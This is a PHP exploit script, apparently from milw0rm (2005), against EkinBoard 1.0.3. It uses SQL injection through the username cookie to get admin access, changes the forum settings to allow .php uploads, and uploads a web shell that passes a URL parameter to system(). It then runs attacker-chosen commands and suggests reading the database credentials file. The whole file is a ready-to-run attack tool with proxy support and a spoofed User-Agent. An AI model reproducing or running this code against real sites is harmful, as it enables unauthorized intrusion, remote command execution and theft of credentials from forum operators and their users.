<?php
#
#   ---ekin103_xpl.php                                  10.47 16/11/2005       #
#                                                                              #
#          EkinBoard 1.0.3 config.php SQL Injection through cookie /           #
#          remote commands execution                                           #
#   --->  (this works with magic_quotes_gpc off)                               #
#                                                                              #
#                              coded by rgod                                   #
#                    site: http://rgod.altervista.org                          #
#                                                                              #
#  usage: launch from Apache, fill in requested fields, then go!               #
#                                                                              #
#  required php.ini settings to launch this script:                            #
#  allow_call_time_pass_reference = on                                         #
#  register_globals = on                                                       #
#                                                                              #
#  Sun-Tzu: "The rising of birds in their flight is the sign of an ambuscade.  #
#  Startled beasts indicate that a sudden attack is coming."                   #

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout", 2);
ob_implicit_flush (1);

echo'<html><head><title>EkinBoard 1.0.3 config.php SQL Injection / cmmnds   xctn
</title><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css"> body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--></style></head><body><p class="Stile6">
EkinBoard 1.0.3 config.php SQL Injection / cmmnds   xctn </p><p class="Stile6">a
script  by  rgod  at        <a href="http://rgod.altervista.org"target="_blank">
http://rgod.altervista.org</a></p><table width="84%"><tr><td width="43%">  <form
name="form1"      method="post"   action="'.$SERVER[PHP_SELF].'?path=value&host=
value&port=value&proxy=value&command=value"><p><input  type="text" name="host">
<span class="Stile5"> * hostname (ex: www.sitename.com)</span></p><p><input
type="text" name="path">  <span class="Stile5">* path ( ex:  /ekinboard/  or jus
t / ) </span></p><p><input type="text" name="command"> <span class="Stile5"> *
specify a command, cat ../../db_info.php to see database username & password
</span></p> <p><input type="text" name="port"><span class="Stile5">specify  a
port other  than  80 ( default  value ) </span></p> <p>  <input  type="text"
name="proxy"> <span class="Stile5">  send  exploit through an  HTTP proxy (ip:por
t)</span></p><p><input type="submit" name="Submit" value="go!"></p></form> </td>
</tr> </table></body></html>';

function show($headeri)
{
$ii=0;
$ji=0;
$ki=0;
$ci=0;
echo '<table border="0"><tr>';
while ($ii <= strlen($headeri)-1)
{
$datai=dechex(ord($headeri[$ii]));
if ($ji==16) {
             $ji=0;
             $ci++;
             echo "<td>&nbsp;&nbsp;</td>";
             for ($li=0; $li<=15; $li++)
                      { echo "<td>".$headeri[$li+$ki]."</td>";
			    }
            $ki=$ki+16;
            echo "</tr><tr>";
            }
if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
{echo "<td>".$datai."</td> ";}
$ii++;
$ji++;
}
for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
                      { echo "<td>&nbsp&nbsp</td>";
                       }

for ($li=$ci*16; $li<=strlen($headeri); $li++)
                      { echo "<td>".$headeri[$li]."</td>";
			    }
echo "</tr></table>";
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacket() //if you have sockets module loaded, 2x speed! if not,load
		              //next function to send packets
{
  global $proxy, $host, $port, $packet, $html, $proxy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket < 0) {
                   echo "socket_create() failed: reason: " . socket_strerror($socket) . "<br>";
                   }
	      else
 		  {   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
                    echo "OK.<br>";
                    echo "Attempting to connect to ".$host." on port ".$port."...<br>";
                    if ($proxy=='')
		   {
		     $result = socket_connect($socket, $host, $port);
		   }
		   else
		   {

		   $parts =explode(':',$proxy);
                   echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
		   $result = socket_connect($socket, $parts[0],$parts[1]);
		   }
		   if ($result < 0) {
                                     echo "socket_connect() failed.\r\nReason: (".$result.") " . socket_strerror($result) . "<br><br>";
                                    }
	                       else
		                    {
                                     echo "OK.<br><br>";
                                     $html= '';
                                     socket_write($socket, $packet, strlen($packet));
                                     echo "Reading response:<br>";
                                     while ($out= socket_read($socket, 2048)) {$html.=$out;}
                                     echo nl2br(htmlentities($html));
                                     echo "Closing socket...";
                                     socket_close($socket);

				    }
                  }
}
function sendpacketii($packet)
{
global $proxy, $host, $port, $html, $proxy_regex;
if ($proxy=='')
           {$ock=fsockopen(gethostbyname($host),$port);}
             else
           {
	   $c = preg_match($proxy_regex,$proxy);
              if (!$c) {echo 'Not a valid prozy...';
                        die;
                       }
	   $parts=explode(':',$proxy);
	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
	    $ock=fsockopen($parts[0],$parts[1]);
	    if (!$ock) { echo 'No response from proxy...';
			die;
		       }
	   }
fputs($ock,$packet);
if ($proxy=='')
  {

    $html='';
    while (!feof($ock))
      {
        $html.=fgets($ock);
      }
  }
else
  {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
    {
      $html.=fread($ock,1);
    }
  }
fclose($ock);
echo nl2br(htmlentities($html));
}


if (($host<>'') and ($path<>'') and ($command<>''))
{
$port=intval(trim($port));
if ($port=='') {$port=80;}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$host=str_replace("\r\n","",$host);
$path=str_replace("\r\n","",$path);


#STEP 1 -> SQL Injection through cookie -> Change forum settings to allow .php attachments
$data="organization=&forum_email=retrogod@aliceposta.it&forum_location=";
$data.=urlencode("http://".$host.":".$port.$path);
$data.="&activate=1&allow_attch=1&attch_exts=gif%2C+jpg%2C+png%2C+txt%2C+php&attch_max_size=";
$data.="20480&upload_avatars=1&terms=&submit=Save+%3E+%3E";

$SQL="'or isnull(1/0) AND level=3/*";
$SQL=urlencode($SQL);
$packet="POST ".$p."admin/index.php?page=general&step=2 HTTP/1.1\r\n";
$packet.="Accept: */*\r\n";
$packet.="Referer: http://".$host.":".$port.$path."admin/index.php?page=general\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="User-Agent: Gameboy, Powered by Nintendo\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: username=".$SQL."; password=\r\n\r\n";
$packet.=$data;
show($packet);
sendpacketii($packet);
if (eregi('Welcome to the EKINboard Administration Panel',$html)) {echo "<br>Exploit succeeded! Now we upload a shell...";}
                                                       else {echo "<br>Exploit failed..."; die;}

#STEP 2 -> Get a forum ID for new topic...
$packet="GET ".$p."viewforum.php?id=1 HTTP/1.1\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: username=".$SQL."; password=\r\n\r\n";
show($packet);
sendpacketii($packet);
$temp=explode('newtopic.php?id=',$html);
$temp2=explode('"',$temp[1]);
$forum=$temp2[0];

echo "Forum id ->".htmlentities($forum);

#STEP 3 -> Upload a shell...
$data='-----------------------------7d536a274d0fb4
Content-Disposition: form-data; name="topic_title"

suntzu
-----------------------------7d536a274d0fb4
Content-Disposition: form-data; name="topic_description"

the art of war
-----------------------------7d536a274d0fb4
Content-Disposition: form-data; name="message"

this is very interesting: SUN TZU ON THE ART OF WAR
THE OLDEST MILITARY TREATISE IN THE WORLD

http://www.chinapage.com/sunzi-e.html
-----------------------------7d536a274d0fb4
Content-Disposition: form-data; name="attachment"; filename="C:\suntzu.php"
Content-Type: application/octet-stream

<?php echo "Hi Master!";error_reporting(0);ini_set("max_execution_time",0);system($HTTP_GET_VARS[cmd]);?>
-----------------------------7d536a274d0fb4
Content-Disposition: form-data; name="MAX_FILE_SIZE"

512000
-----------------------------7d536a274d0fb4--';

$packet="POST ".$p."newtopic.php?id=".$forum."&d=post HTTP/1.1\r\n";
$packet.="Referer: http://".$host.":".$port.$path."newtopic.php?id=1\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d536a274d0fb4\r\n";
$packet.="Accept-Encoding: text/plain\r\n";
$packet.="User-Agent: Googlebot/Test (+http://www.googlebot.com/bot.html)\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n";
$packet.="Cookie: username=".$SQL."; password=\r\n\r\n";
$packet.=$data;
show($packet);
sendpacketii($packet);

#STEP 4 -> Launch commands...
for ($i=1; $i<=99; $i++)
{
$packet="GET ".$p."uploaded/attachments/suntzu_".$i.".php?cmd=".urlencode($command)." HTTP/1.1\r\n";
$packet.="Host: ".$host.":".$port."\r\n";
$packet.="Connection: Close\r\n\r\n";
show($packet);
sendpacketii($packet);
if (eregi('Hi Master',$html)) {echo "Exploit succeeded..."; die;}
}
echo "If you are here exploit succeeded but for some reason, failed to execute commands...";
}
else
{echo "Fill * requested fields, optionally specify a proxy";}
?>

# milw0rm.com [2005-11-17]